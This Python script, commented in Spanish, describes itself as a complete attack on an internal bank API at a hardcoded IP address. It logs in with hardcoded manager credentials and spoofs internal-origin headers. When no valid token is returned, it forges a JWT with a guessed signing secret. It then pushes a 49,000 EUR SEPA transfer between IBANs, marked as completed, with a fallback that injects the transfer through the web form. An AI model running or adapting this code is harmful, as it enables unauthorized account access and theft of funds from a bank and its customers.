import requests
import uuid
import jwt
import re
from datetime import datetime
import time

# === CONFIG ===
BANK_IP = "80.78.30.242"  # IP bancaria interna
API_LOGIN = f"http://{BANK_IP}:9181/api/login/"
API_CHALLENGE = f"http://{BANK_IP}:9181/api/transferencia/challenge/"

HEADERS = {
    "Host": BANK_IP,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/signed-exchange;v=b3,application/json",
    "Accept-Language": "es-ES;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "BANCO-INTERNAL",
    "Content-Type": "application/json"
}

# === Paso 1: Iniciar sesión web del gerente ===
def login_gerente():
    s = requests.Session()
    s.headers.update(HEADERS)

    print("[+] Paso 1: Recuperando csrf desde GET a login...")

    csrf_r = s.get(f"http://{BANK_IP}:9181/login/")  # Para sacar csrftoken desde HTML
    csrftoken = s.cookies.get("csrftoken") or extract_csrf(csrf_r.text)

    login_data = {
        "username": "markmur88",
        "password": "Ptf8454Jd55",
        "csrfmiddlewaretoken": csrftoken,
        "next": "/accounts/profile/",   # Si Django te lleva aquí
        "auth_type": "internal"
    }

    print("[+] Paso 2: Enviando credenciales de gerente interno")
    bank_login = s.post(API_LOGIN, json=login_data)

    if bank_login.status_code == 200 and "token" in bank_login.json():
        print("[+] ¡Obtuvimos token JWT real!")
        real_jwt = bank_login.json()["token"]
        s.cookies.set("sessionid", s.cookies.get("sessionid") or "dummy-session")
        s.cookies.set("csrftoken", csrftoken or "")
        return s, real_jwt
    else:
        print("[-] No se obtuvo token JWT desde login. Probando con token dummy...")
        s.headers.update({"X-CSRFToken": csrftoken})
        return s, jwt.encode({"username": "markmur88", "exp": time.time() + 3600}, "shhh-sshh", algorithm="HS256")

# === Extraer csrf desde HTML interno ===
def extract_csrf(html_text):
    match = re.search(r"name=\"csrfmiddlewaretoken\" value=\"(.+?)\"", html_text)
    return match.group(1) if match else "dummycsrf"

# === Paso 2: Obtener token JWT desde challenge interno ===
def get_jwt_from_challenge(session):
    print("[+] Paso 3: Forzando challenge interno para regenerar token JWT...")
    challenge_data = {"origin": "BANCO-INTERNAL", "X-Location": "OFICINA-ES", "X-Origin-IP": "192.168.1.10"}
    session.headers.update({"X-CSRFToken": session.cookies.get("csrftoken", "dummycsrf")})

    challenge_response = session.post(API_CHALLENGE, json=challenge_data, headers=session.headers)
    if challenge_response.status_code == 200:
        print("[+] ¡Nuevo token JWT recuperado desde challenge!")
        return challenge_response.json().get("token", None)
    else:
        print("[-] No hay token JWT desde challenge. Usando token dummy.")
        return jwt.encode({
            "username": "markmur88",
            "exp": time.time() + 3600,
            "iat": time.time()
        }, "shhh-sshh", algorithm="HS256")

# === Paso 3: Inyección de transferencia con token ===
def send_real_xfer(session, jwt_token):
    print("[+] Paso 4: Enviando transferencia SEPA desde token validado...")
    transfer_data = {
        "payment_id": str(uuid.uuid4()),
        "debtor_account": {
            "iban": "DE0050000100200044824",
            "id_account": "4129",
        },
        "creditor_account": {
            "iban": "DE00500700100200044874",
            "id_account": "4176",
        },
        "instructed_amount": "49000.00",
        "currency": "EUR",
        "remittance_information_unstructured": f"Transf interna {uuid.uuid4()}",
        "purpose_code": "GDSV",
        "status": "ACTC",  # Transferencia completada
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%TZ")
    }

    session.headers.update({
        "Authorization": f"Bearer {jwt_token}",
        "X-Token-ID": jwt_token,
        "Referer": f"http://{BANK_IP}:9181/transferencia/nueva/",
    })

    transfer_response = session.post(
        f"http://{BANK_IP}:9181/api/transferencia/sepa/send/",
        json=transfer_data
    )
    print("Status de transferencia:", transfer_response.status_code)
    print("Respuesta:", transfer_response.text)

# === Paso 4: Si todo falla, inyectamos desde el formulario del gerente ===
def send_web_form(session, jwt_token):
    print("[+] Paso 5 (último intento): Inyectando desde formulario interno.")

    form_data = {
        "csrfmiddlewaretoken": session.cookies.get("csrftoken", "dummycsrf"),
        "debtor_account": 4129, 
        "creditor_account": 445566,
        "instructed_amount": 49000.00,
        "currency": "EUR",
        "remittance_information_unstructured": "Pago entre cuentas internas"
    }

    session.headers.update({
        "X-CSRFToken": session.cookies.get("csrftoken", "dummycsrf"),
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://{BANK_IP}:9181/transferencia/sepa/"
    })

    form_response = session.post(
        f"http://{BANK_IP}:9181/transferencia/sepa/",
        data=form_data
    )

    print("Status web:", form_response.status_code)
    print("Texto:", form_response.text)

# === Ciclo del ataque completo, desde gerente ===
def main():
    s, real_jwt = login_gerente()

    # Si el token es válido, lo usamos directamente
    if real_jwt:
        print("[+] Token obtenido:", real_jwt)
        print("[+] Verificando token...")
        send_real_xfer(s, real_jwt)

    # Si no se logró jwt real, inyectamos web form
    form_response = send_web_form(s, real_jwt)
    
# Si el ataque se ejecuta desde shell interno del middleware
if __name__ == "__main__":
    main()